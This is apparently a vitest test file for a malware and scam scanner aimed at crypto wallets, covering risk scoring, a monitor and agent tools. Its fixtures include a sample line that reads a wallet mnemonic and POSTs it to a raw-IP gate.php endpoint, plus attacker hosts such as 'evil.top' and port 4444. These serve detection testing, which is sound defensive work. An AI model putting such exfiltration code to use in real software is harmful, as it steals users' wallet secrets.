import { describe, expect, it, vi } from "vitest";
import {
  IntegratedScanner,
  RiskScorer,
  Monitor,
  createAgentTools,
  type Finding,
  type ScanTarget,
} from "../src/index.js";

describe("RiskScorer", () => {
  it("escalates to critical on a critical YARA match", () => {
    const scorer = new RiskScorer();
    const findings: Finding[] = [
      {
        source: "yara",
        ruleId: "Sync_Wallet_Stealer",
        title: "stealer",
        description: "",
        category: "malware",
        severity: "critical",
        confidence: 0.9,
      },
    ];
    const r = scorer.score(findings);
    expect(r.escalated).toBe(true);
    expect(r.severity).toBe("critical");
    expect(r.score).toBeGreaterThanOrEqual(80);
  });

  it("returns a low score with no findings", () => {
    expect(new RiskScorer().score([]).severity).toBe("low");
  });
});

describe("IntegratedScanner", () => {
  it("blocks a malicious drainer app and produces remediation", async () => {
    const scanner = new IntegratedScanner();
    const target: ScanTarget = {
      id: "com.drainer",
      kind: "app",
      permissions: ["READ_CLIPBOARD", "BIND_ACCESSIBILITY_SERVICE"],
      text: "const secretKey = wallet.mnemonic; fetch('http://1.2.3.4/gate.php',{method:'POST'})",
      events: [{ type: "network", timestamp: 1, host: "1.2.3.4", port: 4444 }],
    };
    const result = await scanner.scan(target);
    expect(result.severity).toBe("critical");
    expect(result.report.verdict).toBe("blocked");
    expect(result.report.remediation.length).toBeGreaterThan(0);
  });

  it("reports a clean verdict for a benign target", () => {
    const result = new IntegratedScanner().scanLocal({
      id: "com.good",
      kind: "app",
      permissions: [],
      text: "hello world",
    });
    expect(result.report.verdict).toBe("clean");
  });

  it("invokes the opt-in LLM only above the escalation threshold", async () => {
    const llm = vi.fn(async () => [] as Finding[]);
    const scanner = new IntegratedScanner({ llm, llmEscalationThreshold: 60 });

    await scanner.scan({ id: "com.good", kind: "app", text: "benign" });
    expect(llm).not.toHaveBeenCalled();

    await scanner.scan({
      id: "com.bad",
      kind: "contract",
      text: "is_whitelisted; can_sell = false; transfer_hook",
    });
    expect(llm).toHaveBeenCalledOnce();
  });
});

describe("Monitor", () => {
  it("pushes an alert when a session crosses the threshold", () => {
    const scanner = new IntegratedScanner();
    const monitor = new Monitor(scanner, { flushEvery: 2, alertThreshold: "high" });
    const alerts: string[] = [];
    monitor.onAlert((a) => alerts.push(a.title));

    monitor.start({
      id: "com.rat",
      kind: "app",
      permissions: ["READ_CLIPBOARD", "READ_SMS"],
      events: [],
    });
    monitor.ingest("com.rat", { type: "binary_load", timestamp: 1, unsigned: true });
    const alert = monitor.ingest("com.rat", {
      type: "network",
      timestamp: 2,
      host: "evil.top",
    });

    expect(alert).not.toBeNull();
    expect(alerts.length).toBe(1);
  });
});

describe("agent tools", () => {
  it("exposes scanning + rule management tools", async () => {
    const tools = createAgentTools();
    const names = tools.map((t) => t.name);
    expect(names).toContain("scan_contract");
    expect(names).toContain("add_yara_rule");

    const scanUrl = tools.find((t) => t.name === "scan_url")!;
    const report: any = await scanUrl.handler({ url: "s0lana.xyz" });
    expect(report.severity).toBeDefined();
  });
});
